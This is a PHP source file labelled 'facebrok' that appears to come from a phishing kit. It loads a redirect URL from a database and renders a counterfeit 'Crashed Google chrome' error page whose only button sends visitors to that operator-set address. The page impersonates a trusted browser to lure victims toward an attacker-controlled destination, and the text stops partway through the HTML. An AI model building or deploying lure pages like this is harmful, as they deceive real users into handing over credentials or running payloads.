
<?php
// facebrok
error_reporting(E_ALL ^ E_NOTICE);
include("croak/config.php");
// Language--------------------------------
$lang=$_POST['idio'];
if ($lang=='')
{ 
mysql_connect($DB_SERV,$DB_USER,$DB_PASS) or die ('Failed Connection: '.mysql_error());
mysql_select_db($DB_NADB) or die ('Failed in Databases: '.mysql_error());
//-----------------------------------
// Check URL 
$sql=mysql_query("SELECT * FROM methods WHERE id=3") or die('Failed in Consult: '.mysql_error());
$row=mysql_fetch_array($sql);
$lang=''.$row['value'].''; 
// -- END --
} else {$lang=$lang;}
include("lang.php");
// Connections ----------------------
mysql_connect($DB_SERV,$DB_USER,$DB_PASS) or die ('Failed Connection: '.mysql_error());
mysql_select_db($DB_NADB) or die ('Failed in Databases: '.mysql_error());
//-----------------------------------
// Check URL 
$sql=mysql_query("SELECT * FROM methods WHERE id=2") or die('Failed in Consult: '.mysql_error());
$row=mysql_fetch_array($sql);
$url=''.$row['value'].''; 
$name="http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
// -- END --
?>

<title>Crashed Google chrome</title>
<meta http-equiv="Content-type" content="text/html; charset=utf-8" />
<body link="#fff" vlink="#fff" alink="#fff">
<body background="bg.png">
<BODY bgcolor="" topmargin="0" leftmargin="0" rightmargin="0" bottommargin="0" >
<table width="100%" border="0" height="100%" cellspacing="0">
<td valign="middle">
<div align="center">
<OBJECT classid>
    <img src="cr.jpg"><br>
    <font color="white" style="font-size:16px">¡Oh, no!</font>
        <font color="white" style="font-size:14px"><p>
            <?php echo $cra;?>
            <p>
            <form>
                <input type="button" style='width:128px; height:30px' value="<?php echo $crb;?>" onclick="window.location='<?php echo $url;?>'">
            <p>
            <?php echo $crc;?> <a href=""><?php echo $crd;?></a>.